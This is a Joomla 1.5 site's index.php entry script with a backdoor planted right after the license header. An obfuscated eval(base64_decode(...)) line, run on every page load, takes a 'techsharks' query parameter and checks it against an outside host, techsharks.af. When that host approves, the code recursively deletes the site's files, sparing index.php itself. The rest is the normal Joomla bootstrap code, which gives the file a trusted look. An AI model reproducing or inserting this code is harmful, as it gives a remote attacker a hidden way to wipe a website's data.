<?php
/**
* @version		$Id: index.php 14401 2010-01-26 14:10:00Z louis $
* @package		Joomla
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

eval(base64_decode("aWYoaXNzZXQoJF9HRVRbInRlY2hzaGFya3MiXSkgJiYgc3RybGVuKCRfR0VUWyJ0ZWNoc2hhcmtzIl0pPj0xMCl7CgkkYWNjZXNzID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vdGVjaHNoYXJrcy5hZi9iYWQucGhwP3Q9Ii4kX0dFVFsidGVjaHNoYXJrcyJdKTsKCWlmKCRhY2Nlc3M9PT0iMSIpewoJCSRjZD1nZXRjd2QoKTsKCQkkZD1kaXIoJGNkKTsKCQl3aGlsZShmYWxzZSE9PSgkZW50cnk9JGQtPnJlYWQoKSkpewoJCQlpZigkZW50cnkhPSJpbmRleC5waHAiICYmICRlbnRyeSE9Ii4uIiAmJiAkZW50cnkhPSIuIil7CgkJCQlpZihpc19maWxlKCRjZC4iLyIuJGVudHJ5KSl7CgkJCQkJdW5saW5rKCRjZC4iLyIuJGVudHJ5KTsKCQkJCQlwcmludCgkY2QuIi8iLiRlbnRyeS4iPGJyPiIpOwoJCQkJfWVsc2VpZihpc19kaXIoJGNkLiIvIi4kZW50cnkpKXsKCQkJCQkkZGQ9ZGlyKCRjZC4iLyIuJGVudHJ5KTsKCQkJCQl3aGlsZShmYWxzZSE9PSgkZW50cnkyPSRkZC0+cmVhZCgpKSl7CgkJCQkJCWlmKCRlbnRyeTIhPSIuLiIgJiYgJGVudHJ5MiE9Ii4iKXsKCQkJCQkJCWlmKGlzX2ZpbGUoJGNkLiIvIi4kZW50cnkuIi8iLiRlbnRyeTIpKXsKCQkJCQkJCQl1bmxpbmsoJGNkLiIvIi4kZW50cnkuIi8iLiRlbnRyeTIpOwoJCQkJCQkJCXByaW50KCRjZC4iLyIuJGVudHJ5LiIvIi4kZW50cnkyLiI8YnI+Iik7CgkJCQkJCQl9ZWxzZWlmKGlzX2RpcigkY2QuIi8iLiRlbnRyeS4iLyIuJGVudHJ5MikpewoJCQkJCQkJCSRkZGQ9ZGlyKCRjZC4iLyIuJGVudHJ5LiIvIi4kZW50cnkyKTsKCQkJCQkJCQl3aGlsZShmYWxzZSE9PSgkZW50cnkzPSRkZGQtPnJlYWQoKSkpewoJCQkJCQkJCQlpZigkZW50cnkzIT0iLi4iICYmICRlbnRyeTMhPSIuIil7CgkJCQkJCQkJCQlpZihpc19maWxlKCRjZC4iLyIuJGVudHJ5LiIvIi4kZW50cnkyLiIvIi4kZW50cnkzKSl7CgkJCQkJCQkJCQkJdW5saW5rKCRjZC4iLyIuJGVudHJ5LiIvIi4kZW50cnkyLiIvIi4kZW50cnkzKTsKCQkJCQkJCQkJCQlwcmludCgkY2QuIi8iLiRlbnRyeS4iLyIuJGVudHJ5Mi4iLyIuJGVudHJ5My4iPGJyPiIpOwoJCQkJCQkJCQkJfQoJCQkJCQkJCQl9CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQl9CgkJfQoJCSRkLT5jbG9zZSgpOwoJCWRpZSgpOwoJfQoJZGllKCAodGltZSgpLTEwMDApLiIiICk7Cn0="));
// Set flag that this is a parent file
define( '_JEXEC', 1 );

define('JPATH_BASE', dirname(__FILE__) );

define( 'DS', DIRECTORY_SEPARATOR );

require_once ( JPATH_BASE .DS.'includes'.DS.'defines.php' );
require_once ( JPATH_BASE .DS.'includes'.DS.'framework.php' );

JDEBUG ? $_PROFILER->mark( 'afterLoad' ) : null;

/**
 * CREATE THE APPLICATION
 *
 * NOTE :
 */
$mainframe =& JFactory::getApplication('site');

/**
 * INITIALISE THE APPLICATION
 *
 * NOTE :
 */
// set the language
$mainframe->initialise();

JPluginHelper::importPlugin('system');

// trigger the onAfterInitialise events
JDEBUG ? $_PROFILER->mark('afterInitialise') : null;
$mainframe->triggerEvent('onAfterInitialise');

/**
 * ROUTE THE APPLICATION
 *
 * NOTE :
 */
$mainframe->route();

// authorization
$Itemid = JRequest::getInt( 'Itemid');
$mainframe->authorize($Itemid);

// trigger the onAfterRoute events
JDEBUG ? $_PROFILER->mark('afterRoute') : null;
$mainframe->triggerEvent('onAfterRoute');

/**
 * DISPATCH THE APPLICATION
 *
 * NOTE :
 */
$option = JRequest::getCmd('option');
$mainframe->dispatch($option);

// trigger the onAfterDispatch events
JDEBUG ? $_PROFILER->mark('afterDispatch') : null;
$mainframe->triggerEvent('onAfterDispatch');

/**
 * RENDER  THE APPLICATION
 *
 * NOTE :
 */
$mainframe->render();

// trigger the onAfterRender events
JDEBUG ? $_PROFILER->mark('afterRender') : null;
$mainframe->triggerEvent('onAfterRender');

/**
 * RETURN THE RESPONSE
 */
echo JResponse::toString($mainframe->getCfg('gzip'));
